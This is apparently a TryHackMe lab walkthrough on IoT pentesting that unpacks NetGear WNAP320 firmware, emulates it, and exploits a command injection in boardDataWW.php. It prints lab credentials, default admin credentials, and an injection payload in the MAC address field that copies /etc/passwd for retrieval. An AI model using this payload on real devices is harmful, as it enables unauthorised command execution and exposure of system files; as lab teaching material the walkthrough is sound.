# Tryhackme Room Link

**https://tryhackme.com/room/iotintro**  

A beginner friendly walkthrough for internet of things (IoT) pentesting.
----------------------  


##  [Task 1] Foreword   

Deploy the machine  

 ---------------------- 

##  [Task 2] A little theory 

-----------------------

##  [Task 3] Connecting to the machine 

connect via ssh with the given credentials

**Username: iot
Password: tryhackme123!**

**ssh iot@<machineip>**

------------------------

## [Task 4] Unpacking the firmware 

The firmware we are going to use is from NetGear and was used for Access Points (now it's been superceded by another version). In case you want to download it locally on your     
download link: http://www.downloads.netgear.com/files/GDC/WNAP320/WNAP320%20Firmware%20Version%202.0.3.zip    

lets unzip the archive  

**unzip WNAP320\ Firmware\ Version\ 2.0.3.zip**  

**tar -xf WNAP320_V2.0.3_firmware.tar**  

**binwalk -e rootfs.squashfs**  

now look at the extracted folder  

It looks like linux filesystems.  

If you go into /home/www you'll find the web applications that is used.   

lets found which application is vulnerable manually   

## [Task 5] Attacking the application   

e'll take a look at "boardDataWW.php". This file contains a Command Execution vulnerability.  

The vulnerable function is the exec() one. The exec() function executes an external program without displaying the information (basically it's a blind command execution).  

Elevate your shell and copy rootfs.squashfs to firmware-analysis-toolkit folder and change the owner of the file to root.  

**sudo -s**  

copy the file   

**ccp rootfs.squashfs firmware-analysis-toolkit/**  

own the file by specifying the user and the group  

**chown root:root rootfs.squashfs**  

Now, let's kick off fat (firmware analysis toolkit) and emulate the system.  

**./fat.py rootfs.squashfs**

Take note to the IP that is outputted (usually is 192.168.0.100) and press enter to continue the emulation.  

Once the emulation is done, create a port forward on your machine (the attacker machine) using SSH as follows:     

**ssh -N iot@<machine ip> -L 8081:192.168.0.100:80**   

Now, if you access **http://localhost:8081** on your browser you should be able to access the web application (it's a NetGear AP).  

default credentials    
**username: admin**  
**password:password**  

Once logged in, change the url to http://localhost:8081/boardDataWW.php. In the MAC Address field add some junk data  

intercept it with burp  

You'll notice a delay, which means the application is vulnerable to Command Execution. Let's copy the passwd file:  

change it to **macAddress=237864876543;+cp+/etc/passwd+.+#**

and **curl http://localhost:8081/passwd**  

 you have successfully attacked the IoT system   

 






  







